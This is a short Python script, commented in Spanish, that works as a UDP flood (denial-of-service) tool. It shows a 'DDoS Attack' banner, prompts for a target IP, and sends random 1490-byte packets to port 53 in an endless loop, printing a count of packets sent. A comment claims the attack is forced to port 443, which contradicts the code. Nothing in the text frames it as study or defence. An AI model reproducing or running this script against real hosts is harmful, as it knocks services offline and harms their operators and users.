import sys
import os
import time
import socket
import random
from datetime import datetime

# Obtener la hora actual
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Configuración del socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Limpiar pantalla y mostrar banner
os.system("clear")
os.system("figlet DDoS Attack")

# Entrada de IP
ip = input("IP Target: ")
port = 53  # Forzar el ataque únicamente al puerto 443

# Confirmar ataque
os.system("clear")
os.system("figlet Iniciando Ataque")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)

# Iniciar envío de paquetes
sent = 0
try:
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        print(f"Sent {sent} packet to {ip} through port: {port}")
except KeyboardInterrupt:
    print("\nAtaque detenido por el usuario.")
except Exception as e:
    print(f"Error: {e}")

